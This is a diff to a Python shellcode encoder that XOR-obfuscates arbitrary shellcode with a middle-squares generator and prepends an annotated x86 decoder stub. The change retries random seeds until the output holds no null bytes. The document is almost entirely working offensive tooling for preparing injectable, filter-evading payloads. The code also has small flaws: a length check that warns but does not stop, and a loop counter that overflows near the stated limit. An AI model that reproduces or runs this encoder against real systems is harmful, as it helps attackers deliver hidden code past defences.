@@ -22,6 +22,11 @@ def nulls_in_hex(input_int):
             return True
     return False
 
+def nulls_in_bytearray(input_bytearray):
+    for i in input_bytearray:
+        if i == 0:
+            return True
+    return False
 
 def generate_seed():
     """Generate and return an int that when converted to bytes contains no nulls."""
@@ -115,9 +120,6 @@ def encode_to_bytes(seed, shellcode):
 
 
 def set_ecx(rounds_needed):
-    if rounds_needed > 256:
-        return b"\x66\xb9" + rounds_needed.to_bytes(2, byteorder='little')
-    else:
         return b"\xb1" + rounds_needed.to_bytes(1, byteorder='little')
 
 
@@ -155,44 +157,54 @@ def main():
         """If not called with -e encode shellcode, build a decoder, and return
         complete shellcode with completed decoder stub."""
         shellcode = process_shellcode(argv[1])
-        seed = generate_seed()
+        if len(shellcode) > 1023:
+            print('ERROR: Payload cannot be longer than 1024 bytes!')
 
-        decoder = (
-                   bytearray("\xeb\x23"         # <_start>: jmp <call_decoder>
-                             "\x31\xc9"         # <setup>: xor ecx, ecx
-                             "\x5e"             # pop esi
-                             "\x89\xf7",
-                             'iso-8859-1')        # mov edi, esi
+        while True:
+            seed = generate_seed()
+            decoder = (
+                       bytearray("\xeb\x23"         # <_start>: jmp <call_decoder>
+                                 "\x31\xc9"         # <setup>: xor ecx, ecx
+                                 "\x5e"             # pop esi
+                                 "\x89\xf7",
+                                 'iso-8859-1')        # mov edi, esi
 
-                   + b"\xb8"                    # mov eax, <seed>
-                   + seed.to_bytes(4, byteorder='little',
-                                   signed=False)
+                       + b"\xb8"                    # mov eax, <seed>
+                       + seed.to_bytes(4, byteorder='little',
+                                       signed=False)
 
-                   + bytearray(set_ecx(((len(shellcode) // 4) + 1)))
+                       + bytearray(set_ecx(((len(shellcode) // 4) + 1)))
 
-                   + bytearray("\xf7\xe0"       # <decode_loop>: mul eax
-                               "\x66\x89\xd0"   # mov ax, dx
-                               "\xc1\xc8\x10"   # ror eax, 0x10
-                               "\x89\xc3"       # mov ebx, eax
-                               "\x0f\xcb"       # bswap ebx
-                               "\x33\x1f"       # xor ebx, [edi]
-                               "\x89\x1f"       # mov [edi], ebx
-                               "\x83\xc7\x04"   # add edi, 0x04
-                               "\xe2\xeb"       # loop <decode_loop>
-                               "\xff\xe6"       # jmp esi
-                               "\xe8\xd8\xff\xff\xff",  # call <setup>
-                               'iso-8859-1')
-                 )
+                       + bytearray("\xf7\xe0"       # <decode_loop>: mul eax
+                                   "\x66\x89\xd0"   # mov ax, dx
+                                   "\xc1\xc8\x10"   # ror eax, 0x10
+                                   "\x89\xc3"       # mov ebx, eax
+                                   "\x0f\xcb"       # bswap ebx
+                                   "\x33\x1f"       # xor ebx, [edi]
+                                   "\x89\x1f"       # mov [edi], ebx
+                                   "\x83\xc7\x04"   # add edi, 0x04
+                                   "\xe2\xeb"       # loop <decode_loop>
+                                   "\xff\xe6"       # jmp esi
+                                   "\xe8\xd8\xff\xff\xff",  # call <setup>
+                                   'iso-8859-1')
+                     )
 
-        shellcode_with_decoder = decoder + encode_to_bytes(seed, shellcode)
+            shellcode_with_decoder = decoder + encode_to_bytes(seed, shellcode)
 
-        return_string = b''
-        for i in shellcode_with_decoder:
-            return_string += b'\\x'
-            return_string += b'%02x' % (i & 0xff)
+            return_string = b''
+
+            if nulls_in_bytearray(shellcode_with_decoder) is True:
+                continue
+
+            for i in shellcode_with_decoder:
+                return_string += b'\\x'
+                return_string += b'%02x' % (i & 0xff)
+
+            break
 
         print('Middle Squares Shellcode Encoder')
-        print('\nLength: %d\n' % len(return_string))
+        print('Seed used: %s' % hex(seed))
+        print('\nLength: %d\n' % len(shellcode_with_decoder))
         print(return_string.decode("utf-8"))
 
 
